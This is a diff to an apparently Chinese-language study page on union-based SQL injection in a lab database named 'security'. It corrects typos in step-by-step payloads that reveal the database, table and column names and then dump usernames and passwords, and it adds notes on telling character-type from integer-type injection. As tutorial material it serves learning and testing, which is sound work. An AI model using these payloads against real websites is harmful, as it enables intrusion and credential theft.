@@ -472,11 +472,17 @@
 <ol start="4">
 <li><p>爆数据库（得到数据库名称security）<code>?id=-1&#39; union select 2,3, database() --+</code></p>
 </li>
-<li><p>爆表名（得到表名users）<code>?id=-1&#39; union select 2,3,group concat(table_name)from information_schema.tables where table_schema=&#39;security&#39; --+</code></p>
+<li><p>爆表名（得到表名users）<code>?id=-1&#39; union select 2,3,group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39; --+</code></p>
 </li>
 </ol>
-<p>6.爆列名（得到列名username，password…）<code>?id=-1 union select 2,3, group_concat(column_name) from information_schoma.columns where table_name=&#39;users&#39; --+</code></p>
+<p>6.爆列名（得到列名username，password…）<code>?id=-1&#39; union select 2,3, group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
 <p>7.查询内容 <code>?id=-1 union select 2,3, group_concat (username, &#39;:&#39;,password)from security.users --+</code></p>
+<p>判断字符型或整形注入</p>
+<p>id=1 and 1=2 若页面正常则为字符型</p>
+<p>因为若id为字符型，它只会匹配第1个数字，即1后面的数字都默认忽略，语句为真。若为整形改语句后面为假。</p>
+<p>在schemata表中，schema_name字段用来存储数据库名</p>
+<p>在tables表中，table_schema和table_name分别用来存储数据库名和表名</p>
+<p>在columns表中，table_schema（数据库名）、table_name（表名）、columns_name(字段名)</p>
 
                 
             </div>
